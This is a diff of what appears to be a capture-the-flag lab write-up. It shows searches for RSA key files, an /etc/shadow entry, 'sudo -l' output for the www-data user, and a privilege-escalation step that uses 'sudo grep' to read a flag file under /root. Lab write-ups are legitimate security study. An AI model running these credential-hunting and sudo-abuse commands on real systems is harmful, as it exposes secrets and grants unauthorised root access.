@@ -131,6 +131,10 @@ find / -name *rsa*
 /etc/ssh/ssh_host_rsa_key.pub:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdP02ZxAzTiLT5mt+Tm02eJA12GXNRdBWYmSrJp5HttYx8Jr2oSr5xXCQDAUkYKd1wUAaxVgAIOqMBgy9aiY7G+EmNKPA7dxg45WubLlTGefZ7XJHLAjW6r2sGdQvuPRPnw/7ZshgtKXdfR3chCo6XJu6ZFvxLLrlixLDjy5iTn8oQ79BPe4M5vBkHMUCAUPMdctAPbIOzzeiBVVYv2LQtO2h82gYUB4Fwt8tMn6ZCTlSKDq6iDhxt9t32GPCuVbltEWEbJ4OAVdBQEoBf27yZblDJtpjXlMmy8/5AB/TuJH8DowzESRZK26iTmkxcjrfYItPPme8F33y2Xc3SENY/ root@ip-10-10-240-102
 ```
 
+
+
+## priv esc
+
 sudo -l
 ```
 Matching Defaults entries for www-data on ip-10-10-240-102.eu-west-1.compute.internal:
@@ -173,4 +177,8 @@ User www-data may run the following commands on ip-10-10-240-102.eu-west-1.compu
 /etc/shadow:ubuntu:!:17937:0:99999:7:::
 ```
 
-## priv esc
+
+find thrid flag in /root/3rd.txt 
+```
+sudo grep .* /root/3rd.txt
+```
